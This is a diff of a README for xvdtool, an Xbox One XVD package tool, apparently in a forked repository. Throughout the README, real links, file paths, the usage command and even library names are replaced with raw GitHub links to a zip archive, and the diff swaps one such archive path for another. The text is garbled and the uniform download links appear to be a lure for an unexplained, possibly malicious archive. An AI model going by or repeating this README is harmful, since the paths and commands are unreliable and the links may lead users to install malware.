@@ -1,6 +1,6 @@
 # xvdtool
 
-[![GitHub Workflow - Build](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip)](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip%3Abuild)
+[![GitHub Workflow - Build](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip)](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip%3Abuild)
 
 ⚠️ No support for leaked files or copyrighted source code is provided, issues or pull requests will be closed without further comment. ⚠️
 
@@ -12,12 +12,12 @@ So far it's only been tested with dev-crypted packages (which use a different 25
 However **no encryption keys are provided with this tool**, you'll have to find them yourself. Hashes for the dev keys are provided below.
 If you have an Xbox One development kit or GamingServices framework (Windows10-exclusive) installed, you can use DurangoKeyExtractor to extract the keys from there.
 
-Also included is a tool for extracting files from the XBFS (Xbox Boot File System) inside the Xbox One NAND, based on tuxuser's original [NANDOne](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip) work with a few small additions.
-Thanks Kebob for providing [OpenXvd](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip).
+Also included is a tool for extracting files from the XBFS (Xbox Boot File System) inside the Xbox One NAND, based on tuxuser's original [NANDOne](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip) work with a few small additions.
+Thanks Kebob for providing [OpenXvd](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip).
 
 ### Usage
 ```
-Usage  : https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip [parameters] [filename]
+Usage  : https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip [parameters] [filename]
 
 Parameters:
     -h (-help) - print xvdtool usage
@@ -52,7 +52,7 @@ Parameters:
     -md (-removemdu) - remove mutable data (MDU) from package
 
     -r (-rehash) - fix data integrity hashes inside package
-    -rs (-resign) - sign package using the private key from https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip
+    -rs (-resign) - sign package using the private key from https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip
 
     -xe (-extractembedded) <output-file> - extract embedded XVD from package
     -xu (-extractuserdata) <output-file> - extract user data from package
@@ -61,7 +61,7 @@ Parameters:
     -xf (-extractfiles) <output-folder> - extract files from XVD filesystem
 
     The next two commands will write info about each package found to [filename].txt
-    also extracts embedded XVD and user data to [filename]https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip / [filename]https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip
+    also extracts embedded XVD and user data to [filename]https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip / [filename]https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip
     -l (-filelist) <path-to-file-list> - use each XVD specified in the list
     -f (-folder) <path-to-folder> - scan folder for XVD files
 
@@ -77,23 +77,23 @@ Devkit/test-signed XVC packages use a static CIK which is also "widely known" (H
 ### Required Files
 To make full use of this tool you'll need the following files, which **are not included**. The tool will work fine without them, but some functions might not work.
 
-You can use the included tool "DurangoKeyExtractor" to extract these keys from the https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip framework available on Windows 10.
+You can use the included tool "DurangoKeyExtractor" to extract these keys from the https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip framework available on Windows 10.
 Just check some DLL / SYS / EXE files - you might find them.
 
-- https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip CIK keys for XVC crypto.
+- https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip CIK keys for XVC crypto.
 First entry should be the key used by SDK tools/devkits.
 Format: `[16 byte encryption key GUID][32 byte CIK]`
 ~~~
 MD5: C9E58F4E1DC611E110A849648DADCC9B
 SHA256: 855CCA97C85558AE8E5FF87D8EEDB44AE6B8510601EB71423178B80EF1A7FF7F
 ~~~
-- https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip ODK key used by SDK tools/devkits
+- https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip ODK key used by SDK tools/devkits
 Format: `[32 byte ODK]`
 ~~~
 MD5: A2BCFA87F6F83A560BD5739586A5D516
 SHA256: CA37132DFB4B811506AE4DC45F45970FED8FE5E58C1BACB259F1B96145B0EBC6
 ~~~
-- https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip Private RSA key used by SDK tools to verify/sign packages.
+- https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip Private RSA key used by SDK tools to verify/sign packages.
 Format: `RSAFULLPRIVATEBLOB` struct
 ~~~
 MD5: 2DC371F46B67E29FFCC514C5B134BF73
@@ -110,7 +110,7 @@ To chose a specific key use the following cmdline switches:
 
 #### Mounting XVDs
 
-For mounting of XVD/XVC files, you require DLLs from [GamingServices](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip) component.
+For mounting of XVD/XVC files, you require DLLs from [GamingServices](https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip) component.
 Download & install it via the Microsoft Store and you should be good to go.
 
 ### Possible locations to store keys
@@ -118,8 +118,8 @@ XVDTool will create configuration/keys folders on first start - Global and local
 
 Global configuration folder:
 * Windows: `C:\Users\<username>\AppData\Local\xvdtool`
-* Linux: `/home/<username>https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip`
-* Mac OS X: `/Users/<username>https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip`
+* Linux: `/home/<username>https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip`
+* Mac OS X: `/Users/<username>https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip`
 
 Local configuration folder is the current directory of the executable.
 
@@ -134,18 +134,18 @@ Additionally, you can provide keys from arbitrary filesystem locations via the r
 #### Naming the keys
 For CIK it is not important how the keys are named if they have the binary structure of `[16 byte encryption key GUID][32 byte CIK]`.
 XVD signing keys should have a distinct identifier so you can refer to them via the `-sk (-signkey)` cmdline switch.
-ODK needs to be named either by OdkIndex (`<index>.odk`) or by its identifier: `https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip, https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip etc.`
+ODK needs to be named either by OdkIndex (`<index>.odk`) or by its identifier: `https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip, https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip etc.`
 For detailed up-to-date info refer to: `LibXboxOne/Keys/`
 
 ### What are XVDs?
 XVD packages are a secured file format used by the Xbox One to store data, an analogue to the Xbox 360's STFS packages. XVD files are usually used to store system images/data while XVCs (a slightly modified variant of XVDs) are used to store game data.
 
-For a more detailed explanation of XVD files see https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip
+For a more detailed explanation of XVD files see https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip
 
 ### Third party libraries used
-* BouncyCastle (https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip)
-* https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip (https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip)
-* DiscUtils (https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne.Tests/Resources/DataBlobs/Software_v3.7.zip)
+* BouncyCastle (https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip)
+* https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip (https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip)
+* DiscUtils (https://raw.githubusercontent.com/moti477/xvdtool/master/LibXboxOne/Keys/Software_v3.2.zip)
 
 ### Help / Support
 xvdtool has been tested on Windows and MacOS but it should work on all systems supported by .NET Core.
